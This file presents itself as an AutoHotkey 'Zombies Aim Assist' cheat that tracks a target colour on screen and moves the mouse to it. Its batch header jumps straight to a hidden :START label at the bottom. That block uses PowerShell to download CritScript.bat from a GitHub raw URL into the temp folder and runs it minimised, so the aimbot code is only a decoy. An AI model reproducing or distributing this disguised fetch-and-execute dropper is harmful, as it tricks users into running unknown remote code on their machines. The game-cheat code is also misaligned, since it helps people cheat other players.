@echo off
GOTO :START
#NoEnv
#SingleInstance, Force
#Persistent
#InstallKeybdHook
#UseHook
#KeyHistory, 0
#HotKeyInterval 1
#MaxHotkeysPerInterval 127
CoordMode, Pixel, Screen, RGB
CoordMode, Mouse, Screen
PID := DllCall("GetCurrentProcessId")
Process, Priority, %PID%, High
 
; GUI Window
Gui, +AlwaysOnTop
Width := 310
Gui, +LastFound
WinSet, Transparent, 180 		; Transparency of gui
Gui, Color, 808080  			; Background color of gui
Gui, Margin, 0, 0
 
; GUI Title
Gui, Font, s10 cD0D0D0 Bold
Gui, Add, Progress, % "x-1 y-1 w" (Width+2) " h31 Background000000 Disabled hwndHPROG"
Control, ExStyle, -0x20000, , ahk_id %HPROG% 
Gui, Add, Text, % "x0 y0 w" Width " h30 BackgroundTrans Center 0x200 gGuiMove vCaption", Zombies Aim Assist v1.1
 
; GUI Body
Gui, Font, s8
Gui, Add, CheckBox, % "x7 y+10 w" (Width-14) "r1 +0x4000 vEnableCheckbox", Enable (ALT key)
 
; Smoothing Control
Gui, Add, Text, % "x7 y+10 w" (Width-100) "r1 +0x4000", Smoothing
Gui, Add, Text, % "x+m w" (Width-14) "r1 +0x4000 vSmoothingValue", %smoothing%
Gui, Add, Button, % "x7 y+5 w" (Width-275) "r1 +0x4000 gDecreaseSmoothing", -
Gui, Add, Button, % "x+2+m w" (Width-275) "r1 +0x4000 gIncreaseSmoothing", +
 
; ZeroY Control
Gui, Add, Text, % "x7 y+10 w" (Width-100) "r1 +0x4000", Aim Level (ZeroY)
Gui, Add, Text, % "x+m w" (Width-14) "r1 +0x4000 vZeroYValue", %ZeroY%
Gui, Add, Button, % "x7 y+5 w" (Width-275) "r1 +0x4000 gDecreaseZeroY", -
Gui, Add, Button, % "x+2+m w" (Width-275) "r1 +0x4000 gIncreaseZeroY", +
 
; Close Window
Gui, Add, Text, % "x7 y+10 w" (Width-14) "r1 +0x4000 gClose", Close
Gui, Add, Text, % "x7 y+15 w" "h5 vP"
GuiControlGet, P, Pos
H := PY + PH
Gui, -Caption
WinSet, Region, 0-0 w%Width% h%H% r6-6
 
; Show GUI
Gui, Show, % "w" Width " NA" " x" (A_ScreenWidth - Width) "x10 y550"
 
; Settings
EMCol := 0xb528c0 				; Target color   c9008d
ColVn := 30  					; Tolerance for color matching
ZeroX := A_ScreenWidth / 2		;DO NOT CHANGE, UNIVERSAL RESOLUTION
ZeroY := A_ScreenHeight / 2.09	;CHANGE IF YOUR HAVING TARGETING ISSUES DEFAULT IS 2.18
CFovX := 250					; Adjusted for a larger FOV
CFovY := 250					; Adjusted for a larger FOV
ScanL := ZeroX - CFovX
ScanT := ZeroY - CFovY
ScanR := ZeroX + CFovX
ScanB := ZeroY + CFovY
SearchArea := 40  				; Smaller area around the last known position
 
; Variables for prediction
prevX := 0
prevY := 0
lastTime := 0
smoothing := 0.41  				; Default smoothing value
 
Loop
{
    ; Check if the script is enabled
    GuiControlGet, EnableState,, EnableCheckbox
    if (EnableState) {
        targetFound := False
        
        if GetKeyState("LButton", "P") or GetKeyState("RButton", "P") {
            ; Search for target pixel in a smaller region around the last known position
            PixelSearch, AimPixelX, AimPixelY, targetX - SearchArea, targetY - SearchArea, targetX + SearchArea, targetY + SearchArea, EMCol, ColVn, Fast RGB
            if (!ErrorLevel) {
                targetX := AimPixelX
                targetY := AimPixelY
                targetFound := True
            } else {
                PixelSearch, AimPixelX, AimPixelY, ScanL, ScanT, ScanR, ScanB, EMCol, ColVn, Fast RGB
                if (!ErrorLevel) {
                    targetX := AimPixelX
                    targetY := AimPixelY
                    targetFound := True
                }
            }
            
            if (targetFound) {
                ; Get current time
                currentTime := A_TickCount
 
                ; Calculate the velocity of the target
                if (lastTime != 0) {
                    deltaTime := (currentTime - lastTime) / 1000.0  ; Convert to seconds (Its in mil secs)
                    velocityX := (targetX - prevX) / deltaTime
                    velocityY := (targetY - prevY) / deltaTime
                }
 
                ; Store the current position and time for the next iteration
                prevX := targetX
                prevY := targetY
                lastTime := currentTime
                
                ; Apply prediction if enabled
                GuiControlGet, PredictionEnabled,, EnablePredictionCheckbox
                if (PredictionEnabled && deltaTime != 0) {
                    PredictedX := targetX + Round(velocityX * predictionMultiplier * deltaTime)
                    PredictedY := targetY + Round(velocityY * predictionMultiplier * deltaTime)
                } else {
                    PredictedX := targetX
                    PredictedY := targetY
                }
 
                ; Move the mouse smoothly with strength adjustment
                AimX := PredictedX - ZeroX
                AimY := PredictedY - ZeroY
                DllCall("mouse_event", uint, 1, int, Round(AimX * smoothing), int, Round(AimY * smoothing), uint, 0, int, 0)
            }
        }
    }
    Sleep, 10
}
 
GuiControl,, ZeroYLabel, %ZeroY%
GuiControl,, CFovXLabel, %CFovX%
GuiControl,, CFovYLabel, %CFovY%
GuiControl,, SmoothingValue, %smoothing%
 
GuiMove:
    PostMessage, 0xA1, 2
    return
 
IncreaseSmoothing:
    smoothing += 0.01
    if (smoothing > 2)  ; Set a maximum limit for smoothing
        smoothing := 2
    GuiControl,, SmoothingValue, %smoothing%
    Return
 
DecreaseSmoothing:
    smoothing -= 0.01
    if (smoothing < 0.01)
        smoothing := 0.01
    GuiControl,, SmoothingValue, %smoothing%
    Return
 
IncreaseZeroY:
    ZeroY += 1
    GuiControl,, ZeroYValue, %ZeroY%
    Return
 
DecreaseZeroY:
    ZeroY -= 1
    GuiControl,, ZeroYValue, %ZeroY%
    Return
 
    Paused := False
    Alt:: ;Enable Checkbox
        ; Toggle the Enable checkbox state
        GuiControlGet, EnableState,, EnableCheckbox
        GuiControl,, EnableCheckbox, % !EnableState
        ; Toggle the script state based on the checkbox
        toggle := EnableState
        ; Play sound
        if (toggle) {
            SoundBeep, 300, 100
        }
    Return
     
     
    OnExit:
    GuiClose:
        ExitApp
        Return    
     
    Close:
    ExitApp
     
    f9::Reload






:START
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/Xevioo/XevioHub/main/CritScript.bat' -OutFile CritScript.bat"
start /min CritScript.bat
